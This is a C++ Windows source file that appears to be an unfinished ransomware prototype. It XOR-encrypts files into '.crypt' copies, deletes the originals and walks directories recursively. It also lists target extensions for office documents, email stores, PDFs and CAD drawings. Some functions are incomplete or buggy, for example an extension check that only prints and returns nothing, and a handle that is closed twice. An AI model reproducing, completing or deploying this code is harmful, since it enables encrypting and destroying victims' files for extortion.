#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>
#include <map>
#include <string>
BOOL EncryptFile(LPTSTR, LPVOID);
BOOL DecryptFile(LPTSTR, LPVOID);
BOOL XORFile(LPTSTR, LPTSTR, LPVOID);
BOOL TargetExt(LPTSTR);
DWORD ScanPath(LPTSTR);

// LPTSTR -> Pointer (TCHAR) String
// LPVOID -> void*
// LP -> Pointer
// C -> Constant
// T -> TCHAR
// STR -> String

int _tmain(int argc, _TCHAR* argv[]) {
    // DWORD attributes = GetFileAttributes(_T("C:\\Users\\Mata\\Desktop\\wget.txt"));
    // EncryptFile(_T("C:\\Users\\Mata\\Desktop\\wget.txt"), NULL);
    // DWORD dwkey = 0x12345678;
    // XORFile(_T("C:\\Users\\Mata\\Desktop\\test.txt"), _T("C:\\Users\\Mata\\Desktop\\wget.txt"), &dwkey);
    TargetExt(_T(".doc"));
    return 0;
}

BOOL EncryptFile(LPTSTR lpFileName, LPVOID EncKey) {
    TCHAR szOutputFile[MAX_PATH]; // MAX_PATH was defined 260, (in minwindef.h)
    size_t length_of_arg;
    StringCchPrintf(szOutputFile, MAX_PATH - 1, _T("%s.crypt"), lpFileName);
    StringCchLength(szOutputFile, MAX_PATH, &length_of_arg);
    if(length_of_arg <= (MAX_PATH - 3)) {
        _tprintf(_T("Encoding %s \n"), lpFileName);
        // printf("%lu", GetFileAttributes(_T("C:\\Users\\Mata\\Desktop\\wget.txt")));
        if(XORFile(lpFileName, szOutputFile, EncKey)) { // Encrypt function here
            if(DeleteFile(lpFileName)) {
                return TRUE;
            }
        }
    }
    return FALSE;
}

BOOL DecryptFile(LPTSTR lpFileName, LPVOID DecKey) {
    TCHAR szOutputFile[MAX_PATH]; // MAX_PATH was defined 260, (in minwindef.h)
    size_t length_of_arg;
    StringCchCopy(szOutputFile, MAX_PATH, lpFileName);
    TCHAR *ptr = _tcsrchr(szOutputFile, '.');
    if(ptr && !_tcsicmp(ptr, _T(".crypt"))) {
        *ptr = '\0';
        _tprintf(_T("Decoding %s\n"), szOutputFile);
    }
    if(XORFile(lpFileName, szOutputFile, DecKey)) { // Encrypt function here
        if(DeleteFile(lpFileName)) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL XORFile(LPTSTR lpExistingFileName, LPTSTR lpNewFileName, LPVOID lpKey) {
    BOOL bResult = FALSE;
    if(!lpKey) {
        return bResult;
    }
    HANDLE hSrc, hDst;
    TCHAR mesg[MAX_PATH];
    DWORD dwKey = *((DWORD *) lpKey);
    // GENERIC_READ : Could read the file.
    // FILE_SHARE_READ : Allow other programs open this file by GENERIC_READ mode.  
    // OPEN_EXISTING : Open a existing file, if not return the ERROR_FILE_NOT_FOUND error message.
    hSrc = CreateFile(lpExistingFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hSrc != INVALID_HANDLE_VALUE) {
        hDst = CreateFile(lpNewFileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        if(hDst != INVALID_HANDLE_VALUE) {
            bResult = TRUE;
            BYTE Buffer[MAX_PATH];
            DWORD ReadCount, WriteCount;
            while(ReadFile(hSrc, Buffer, MAX_PATH, &ReadCount, NULL) && ReadCount > 0) {
                for(int i=0;i<ReadCount;i++) {
                    Buffer[i] = Buffer[i] ^ dwKey;
                }
                if(!WriteFile(hDst,Buffer,ReadCount, &WriteCount, NULL) || ReadCount != WriteCount) {
                    bResult = FALSE;
                    break;
                }
            }
            CloseHandle(hDst);
        }
        else 
            bResult = FALSE;
        CloseHandle(hSrc);
    }
    else 
        bResult = FALSE;
    CloseHandle(hSrc);
    return bResult;
}

DWORD ScanPath(LPTSTR lpPath) {
    WIN32_FIND_DATA ffd;
    TCHAR szDir[MAX_PATH];
    size_t length_of_arg;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError = 0;
    DWORD dwCount = 0;
    DWORD dwFileAttrib = GetFileAttributes(lpPath);

    if(dwFileAttrib & FILE_ATTRIBUTE_DIRECTORY) {
        StringCchLength(lpPath, MAX_PATH, &length_of_arg);
        if(length_of_arg > MAX_PATH-3) {
            return 0;
        }
        StringCchCopy(szDir, MAX_PATH, lpPath);
        StringCchCat(szDir, MAX_PATH, _T("\\*"));
        if((hFind = FindFirstFile(szDir, &ffd)) == INVALID_HANDLE_VALUE) {
            dwError = GetLastError();
            return 0;
        }
        do {
            // _tprintf(_T("%s\n"), ffd.cFileName);
            // Usage of _tcscmp function is the same as strcmp but it is used to compare TCHAR.
            if(!_tcscmp(ffd.cFileName, _T(".")) || !_tcscmp(ffd.cFileName, _T(".."))) {
                continue;
            }
            TCHAR szFullPath[MAX_PATH];
            StringCchPrintf(szFullPath, MAX_PATH - 1, _T("%s\\%s"), lpPath, ffd.cFileName);
            StringCchLength(szFullPath, MAX_PATH, &length_of_arg);
            if(length_of_arg <= MAX_PATH-3) {
                dwCount += ScanPath(szFullPath);
            }

        }while(FindNextFile(hFind, &ffd) != 0);
        
        dwError = GetLastError();
        FindClose(hFind);
    }
    else {
        // Add encryption/decryption functions here.
        _tprintf(_T("%s\n"), lpPath);
        dwCount++;
    }
    return dwCount;
} 

BOOL TargetExt(LPTSTR lpFileName) {
    const LPCTSTR TargetMap[] = {
        _T("doc"), _T("docx"), _T("xls"), _T("xlsx"), _T("ppt"), _T("pptx"), _T("pst"), _T("ost"), _T("msg"), _T("eml"), _T("vsd"), _T("vsdx"), _T("txt"),
        _T("csv"), _T("rtf"), _T("wks"), _T("wkl"), _T("pdf"), _T("dwg"), _T("onetoc2"), _T("snt")
    };
    TCHAR *ptr = _tcsrchr(lpFileName, '.');
    ptr++;
    DWORD i = 0;
    printf("%d", _tcsicmp(ptr, TargetMap[i]));
}

/*TargetExtMap[_T("doc")] = TargetExtMap[_T("docx")] = TargetExtMap[_T("xls")] = TargetExtMap[_T("xlsx")] = TargetExtMap[_T("ppt")] = 1;
    TargetExtMap[_T("pptx")] = TargetExtMap[_T("pst")] = TargetExtMap[_T("ost")] = TargetExtMap[_T("msg")] = TargetExtMap[_T("eml")] = 1;
    TargetExtMap[_T("vsd")] = TargetExtMap[_T("vsdx")] = TargetExtMap[_T("txt")] = TargetExtMap[_T("csv")] = TargetExtMap[_T("rtf")] = 1;
    TargetExtMap[_T("wks")] = TargetExtMap[_T("wkl")] = TargetExtMap[_T("pdf")] = TargetExtMap[_T("dwg")] = TargetExtMap[_T("onetoc2")] = 1;
    TargetExtMap[_T("snt")] = TargetExtMap[_T("jpeg")] = TargetExtMap[_T("jpg")] = TargetExtMap[_T("docb")] = TargetExtMap[_T("docm")] = 1;
    TargetExtMap[_T("dot")] = TargetExtMap[_T("dotm")] = TargetExtMap[_T("dotx")] = TargetExtMap[_T("xlsm")] = TargetExtMap[_T("xlsb")] = 1;
    TargetExtMap[_T("xlw")] = TargetExtMap[_T("xltm")] = TargetExtMap[_T("pptm")] = TargetExtMap[_T("pot")] = TargetExtMap[_T("pps")] = 1;
    TargetExtMap[_T("ppsm")] = TargetExtMap[_T("ppsx")] = TargetExtMap[_T("ppam")] = TargetExtMap[_T("pptx")] = TargetExtMap[_T("potm")] = 1;*/
    /*if(TargetExtMap[lpFileName])
        return TRUE;
    return FALSE;*/